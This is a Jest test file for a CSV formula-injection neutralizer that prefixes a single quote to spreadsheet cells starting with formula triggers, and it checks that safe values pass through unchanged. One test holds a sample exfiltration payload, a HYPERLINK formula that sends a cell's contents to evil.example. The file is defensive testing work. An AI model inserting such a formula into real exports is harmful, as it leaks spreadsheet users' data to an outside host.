'use strict';

/**
 * C5-04 (audit 2026-06-10) — CSV formula-injection neutralizer.
 * Locks the dangerous-prefix set + the single-quote defense used by every
 * finance/audit CSV exporter.
 */
const { neutralizeCsvFormula } = require('../../shared/csv-utils');

describe('[audit-2026-06-10 C5-04] neutralizeCsvFormula', () => {
    it('prefixes a single quote on cells starting with a formula trigger', () => {
        expect(neutralizeCsvFormula('=1+1')).toBe("'=1+1");
        expect(neutralizeCsvFormula('+44123')).toBe("'+44123");
        expect(neutralizeCsvFormula('-2+3')).toBe("'-2+3");
        expect(neutralizeCsvFormula('@SUM(A1)')).toBe("'@SUM(A1)");
        expect(neutralizeCsvFormula('\tfoo')).toBe("'\tfoo");
        expect(neutralizeCsvFormula('\rfoo')).toBe("'\rfoo");
    });

    it('neutralizes the classic exfiltration payload', () => {
        const payload = '=HYPERLINK("http://evil.example/?leak="&A1,"click")';
        expect(neutralizeCsvFormula(payload)).toBe(`'${payload}`);
    });

    it('leaves safe values untouched', () => {
        expect(neutralizeCsvFormula('สมชาย เกษตรทอง')).toBe('สมชาย เกษตรทอง');
        expect(neutralizeCsvFormula('APP-2569-ABC123')).toBe('APP-2569-ABC123');
        expect(neutralizeCsvFormula('1234.56')).toBe('1234.56');
        expect(neutralizeCsvFormula('a=b')).toBe('a=b'); // trigger only matters at position 0
    });

    it('is a no-op on empty / non-string input', () => {
        expect(neutralizeCsvFormula('')).toBe('');
        expect(neutralizeCsvFormula(null)).toBe(null);
        expect(neutralizeCsvFormula(undefined)).toBe(undefined);
    });
});
